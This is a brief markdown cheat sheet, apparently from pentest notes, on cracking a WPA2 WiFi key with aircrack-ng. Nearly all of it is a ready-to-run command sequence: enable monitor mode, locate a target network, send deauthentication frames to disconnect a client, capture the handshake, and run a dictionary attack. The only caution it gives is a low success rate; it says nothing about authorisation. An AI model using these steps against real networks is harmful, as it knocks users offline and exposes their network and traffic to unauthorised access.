# Crack WPA2

A basic way to crack WPA2 key.

> :warning: low success rate.

## Aircrack-ng

[Aircrack-ng](https://www.aircrack-ng.org/) is a complete suite of tools to assess WiFi network security.

```bash
# start wifi monitor mode

airmon-ng start $IFACE

# run airodump-ng and note target bssid and channel

airodump-ng

# start wifi monitor mode on targets channel

airmon-ng start $IFACE $CHANNEL

# capture handshake; send deauth

airodump-ng -c $CHANNEL --bssid $BSSID -w psk $IFACE

aireplay-ng -0 1 -a $BSSID -c $CLIENT $IFACE

# dictionary attack on .cap

aircrack-ng -w password.lst -b $BSSID psk*.cap
```